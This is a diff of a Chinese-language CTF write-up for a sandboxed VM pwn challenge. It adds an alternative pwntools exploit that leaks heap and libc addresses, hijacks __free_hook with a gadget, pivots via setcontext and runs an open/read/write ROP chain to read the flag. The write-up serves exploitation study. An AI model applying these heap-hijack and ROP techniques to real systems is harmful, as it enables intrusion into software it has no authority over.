@@ -24,7 +24,7 @@ main函数进去比较简单, 也就不多赘述了, 直接进入下层函数,
 
 `init_mem`中基本都是赋值为0的初始化, 其实也看不出啥, 
 
-`vm_init`函数是读取文件并载入到内存中, 其中还设置了沙盒, 只允许open read write, 而且题目libc是2.31, setcontext不能使用, 得一点点写rop, 
+`vm_init`函数是读取文件并载入到内存中, 其中还设置了沙盒, 只允许open read write, 而且题目libc是2.31,可以找gadget使用setcontext, 也可以打印environ泄漏堆地址直接写rop, 
 
 然后在`vm_run`函数中就是运行虚拟机, 修一下跳转表, 
 
@@ -496,6 +496,120 @@ def exp2():
 
 ```
 
+更新下另一个解法, 可以使用setcontext, 但是在2.29以后的版本rdi换成了rdx, 找到了一个比较有用的gadget, 
+
+> 其实要找的gadget大概是, 存在rdi到rdx赋值,最后使用rdx或rdi调整程序流
+
+![image-20210730092531205](https://i.loli.net/2021/07/30/DIyztCB9YQdEFuv.png)
+
+然后freehook改为gadget, 然后设置好rdx以后再去setcontext, 
+
+```python
+
+def exp2():
+    payload  = rop([pop, chunk_list, 0, printf], 0)
+    sl(payload)
+    recv()
+    heap = u64(re(6, 2).ljust(8, b'\x00'))
+    heap = heap - 0x480
+    print(hex(heap))
+    
+    heap1 = heap + 0x480 
+    heap2 = heap + 0x4d0
+
+    
+    def my_new(size):
+        sl(rop([pop, size, 0, syscall3], 0))
+
+    def my_dele(ptr):
+        sl(rop([pop, ptr, 0, syscall4], 0))
+
+    def my_show(ptr):
+        sl(rop([pop, ptr, 0, syscall7], 0))
+    
+    def my_edit(ptr, size):
+        sl(rop([pop, ptr, size, syscall6], 0))
+
+    my_new(0x500)
+    heap3 = heap + 0x520
+    my_dele(heap3)
+
+    my_edit(heap1, 0x100000004)
+    payload = flat('a' * 0x20, 0, 0x21, heap3, 0x1000)
+    sl(payload)
+
+    my_show(heap3)
+    ru("ontent: ")
+    main_aeran = u64(re(6, 2).ljust(8, b'\x00'))
+    print(hex(main_aeran))
+    LIBC = main_aeran - 0x1ebbe0
+    print("libc: " + hex(LIBC))
+    libc = ELF("./libc.so.6")
+    env = libc.sym['environ'] + LIBC 
+
+    gadget = LIBC + 0x0000000000154930
+    setcontext = LIBC + libc.sym['setcontext']
+    fhook = LIBC + libc.sym['__free_hook']
+
+    my_edit(heap2, 0x100000004)
+    sl(flat('a' * 0x20, 0, 0x21, fhook, 0x100))
+    my_edit(fhook, 0x100000004)
+    sl(flat(gadget))
+
+    my_new(0x500)
+    heap4 = heap3 
+    my_edit(heap4, 0x100000004)
+
+    ret = LIBC + 0x00000000000c054a
+    poprax = 0x4a550 + LIBC
+    poprdi = 0x26b72 + LIBC
+    poprsi = 0x27529 + LIBC
+    poprdx = 0x11c371 + LIBC
+    syscall = 0x66229 + LIBC
+
+    flag = heap4 + 0xb0
+
+    payload = flat(
+        0, heap4, 0, 0, # 0
+        setcontext+0x3d, 0, # 0x20 
+        0, 0, # 30
+        0, 0, # 40 
+        0, 0, # 50 
+        0, 0, # 60 
+        0, 0, # 70
+        0, 0, # 80 
+        0, 0, # 90 
+        heap4+0x100, ret, # a0
+        # stack 0xb0
+        './flag\x00'
+        ).ljust(0x100, b'b') 
+    payload += flat(
+        # open("./flag")
+        poprax, 2, 
+        poprdi, flag, 
+        poprsi, 0, 
+        poprdx, 0, 0, 
+        syscall, 
+        # read(3, buf, 0x100)
+        poprax, 0, 
+        poprdi, 3, 
+        poprsi, flag, 
+        poprdx, 0x100, 0, 
+        syscall, 
+        # write(1, buf, 0x100)
+        poprax, 1, 
+        poprdi, 1, 
+        poprsi, flag, 
+        poprdx, 0x100, 0, 
+        syscall
+            )
+
+    sl(payload)
+
+    my_dele(heap4)
+
+```
+
 
 
 完整exp
@@ -517,7 +631,7 @@ from pwn import *
 
 pie  = 1
 arch = 64
-bps  = [0x000000000000228D]
+bps  = [0x000000000003BE3]
 
 def change():
     ru("challenge ")
@@ -610,7 +724,71 @@ def exp2():
     libc = ELF("./libc.so.6")
     env = libc.sym['environ'] + LIBC 
 
+    gadget = LIBC + 0x0000000000154930
+    setcontext = LIBC + libc.sym['setcontext']
+    fhook = LIBC + libc.sym['__free_hook']
 
+    my_edit(heap2, 0x100000004)
+    sl(flat('a' * 0x20, 0, 0x21, fhook, 0x100))
+    my_edit(fhook, 0x100000004)
+    sl(flat(gadget))
+
+    '''
+    my_new(0x500)
+    heap4 = heap3 
+    my_edit(heap4, 0x100000004)
+
+    ret = LIBC + 0x00000000000c054a
+    poprax = 0x4a550 + LIBC
+    poprdi = 0x26b72 + LIBC
+    poprsi = 0x27529 + LIBC
+    poprdx = 0x11c371 + LIBC
+    syscall = 0x66229 + LIBC
+
+    flag = heap4 + 0xb0
+
+    payload = flat(
+        0, heap4, 0, 0, # 0
+        setcontext+0x3d, 0, # 0x20 
+        0, 0, # 30
+        0, 0, # 40 
+        0, 0, # 50 
+        0, 0, # 60 
+        0, 0, # 70
+        0, 0, # 80 
+        0, 0, # 90 
+        heap4+0x100, ret, # a0
+        # stack 0xb0
+        './flag\x00'
+        ).ljust(0x100, b'b') 
+    payload += flat(
+        # open("./flag")
+        poprax, 2, 
+        poprdi, flag, 
+        poprsi, 0, 
+        poprdx, 0, 0, 
+        syscall, 
+        # read(3, buf, 0x100)
+        poprax, 0, 
+        poprdi, 3, 
+        poprsi, flag, 
+        poprdx, 0x100, 0, 
+        syscall, 
+        # write(1, buf, 0x100)
+        poprax, 1, 
+        poprdi, 1, 
+        poprsi, flag, 
+        poprdx, 0x100, 0, 
+        syscall
+            )
+
+    sl(payload)
+
+    my_dele(heap4)
+    '''
+
+
+    '''
     my_edit(heap2, 0x100000004)
     payload = flat('a' * 0x20, 0, 0x21, env, 0x1000)
     sl(payload)
@@ -655,6 +833,7 @@ def exp2():
         syscall
         ))
 
+    '''
 
 
 context.os='linux'
@@ -678,6 +857,16 @@ else:
 
 elf = ELF('./bin')
 
+def gdba():
+    if local == 0:
+        return 0;
+    cmd ='set follow-fork-mode parent\n'
+    #cmd=''
+    if pie:
+        cmd +=''.join(['b *$rebase({:#x})\n'.format(b) for b in bps])
+    else:
+        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])
+    gdb.attach(cn,cmd)
 
 re  = lambda m, t : cn.recv(numb=m, timeout=t)
 recv= lambda      : cn.recv()
@@ -690,6 +879,12 @@ sla = lambda a, b : cn.sendlineafter(a, b)
 sa  = lambda a, b : cn.sendafter(a, b)
 sll = lambda x    : cn.sendlineafter(':', x)
 # after a, send b;
+from pwnlib.util import cyclic
+ff  = lambda arg, f=cyclic.de_bruijn(), l=None :flat(*arg, filler=f, length=l)
+
+def slog_show():
+    for i in slog:
+        success(i + ' ==> ' + hex(slog[i]))
 
 while 1:
     cn = process("./bin")
